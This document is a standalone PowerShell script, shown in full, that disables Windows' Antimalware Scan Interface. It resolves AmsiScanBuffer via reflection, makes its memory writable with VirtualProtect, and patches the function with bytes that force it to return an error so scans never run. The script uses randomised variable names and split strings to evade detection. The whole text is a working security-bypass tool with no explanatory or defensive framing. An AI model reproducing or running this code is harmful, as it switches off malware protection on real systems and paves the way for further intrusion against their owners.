function Get-FunctionBaseAddress {
    Param ($ThinBall, $SquealRepair)
    $RateSink = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $SneakyCannon = $RateSink.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $HoneyReduce = $SneakyCannon[0].Invoke($null, ($RateSink.GetMethod('GetModuleHandle').Invoke($null,@($ThinBall)), $SquealRepair))
    return $HoneyReduce
}
function Get-DelegateType {
    Param ([Type[]] $GuessRabid, [Type] $HeadyComb = [Void] )
    $CoolSilent = [AppDomain]::CurrentDomain.DefineDynamicAssembly((new`-`obje`ct System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $CoolSilent.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $GuessRabid).SetImplementationFlags('Runtime, Managed')
    $CoolSilent.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $HeadyComb, $GuessRabid).SetImplementationFlags('Runtime, Managed')
    return $CoolSilent.CreateType()
}
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[IntPtr]$PenClover = Get-FunctionBaseAddress -ThinBall ("am"+"si.dll") -SquealRepair ("Amsi"+"Scan"+"Buffer")
$AlertFork = 0
[IntPtr] $SmashParty = Get-FunctionBaseAddress -ThinBall ("kern"+"el32.dll") -SquealRepair ("Virtual"+"Protect")
$UnrulyFix = Get-DelegateType -GuessRabid @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -HeadyComb ([Bool])
$NoteVoyage=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SmashParty, $UnrulyFix)
$NoteVoyage.Invoke($PenClover, [uint32]5, 0x40, [ref]$AlertFork)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $PenClover, 6)

